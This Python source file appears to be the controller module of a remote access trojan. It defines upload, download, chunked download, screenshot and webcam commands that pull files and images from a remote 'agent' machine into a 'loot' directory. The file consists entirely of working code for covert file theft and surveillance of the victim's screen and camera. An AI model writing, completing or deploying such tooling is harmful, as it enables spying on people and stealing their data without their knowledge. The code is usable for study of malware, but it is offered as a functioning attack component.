import os

from server.commands.base import ServerCommand
from server.handlers.file_transfer import upload_file, download_file
from server.handlers.chunked_receiver import ChunkedReceiver
from server.ui.prompt import print_colored


_chunked_receiver = ChunkedReceiver()


def _sanitize_path(loot_dir, filename):
    save_path = os.path.realpath(os.path.join(loot_dir, filename))
    real_loot = os.path.realpath(loot_dir)
    if not save_path.startswith(real_loot + os.sep) and save_path != real_loot:
        return None
    return save_path


class UploadCommand(ServerCommand):
    name = 'upload'
    is_transfer = True

    def execute(self, ctx, raw: str):
        file_path = raw[7:].strip()
        if not os.path.exists(file_path):
            print_colored('[-] File Not Found on Server', 'red')
            return True
        if not os.path.isfile(file_path):
            print_colored('[-] Not a file', 'red')
            return True
        ctx.protocol.send(raw)
        upload_file(ctx.protocol, file_path)
        try:
            result = ctx.protocol.recv()
            print(result)
        except Exception as e:
            print_colored(f'[-] Upload failed: {str(e)}', 'red')
        return True


class DownloadCommand(ServerCommand):
    name = 'download'
    is_transfer = True

    def execute(self, ctx, raw: str):
        remote_path = raw[9:].strip()
        ctx.protocol.send(raw)
        filename = os.path.basename(remote_path) or 'downloaded_file'
        save_path = os.path.join(ctx.agent_loot_dir, filename)
        _chunked_receiver.receive(ctx.protocol, save_path)
        return True


class DownloadLargeCommand(ServerCommand):
    name = 'download_large'
    is_transfer = True

    def execute(self, ctx, raw: str):
        parts = raw[15:].strip().split()
        if not parts:
            print_colored('[-] Usage: download_large <remote_path> [chunk_size_kb]', 'red')
            return True
        remote_path = parts[0]
        chunk_size_kb = int(parts[1]) if len(parts) > 1 else 512
        ctx.protocol.send(f'chunked_download {remote_path} {chunk_size_kb}')
        filename = os.path.basename(remote_path) or 'downloaded_file'
        save_path = os.path.join(ctx.agent_loot_dir, filename)
        _chunked_receiver.receive(ctx.protocol, save_path)
        return True


class ScreenshotCommand(ServerCommand):
    name = 'screenshot'
    is_transfer = True

    def execute(self, ctx, raw: str):
        ctx.protocol.send(raw)
        save_path = os.path.join(ctx.agent_loot_dir, f'screenshot{ctx.screenshot_count}.png')
        ctx.screenshot_count += 1
        download_file(ctx.protocol, save_path)
        return True


class WebcamCommand(ServerCommand):
    name = 'webcam'
    is_transfer = True

    def execute(self, ctx, raw: str):
        ctx.protocol.send(raw)
        timestamp = __import__('time').strftime('%Y%m%d_%H%M%S')
        save_path = os.path.join(ctx.agent_loot_dir, f'webcam_{timestamp}.png')
        download_file(ctx.protocol, save_path)
        return True
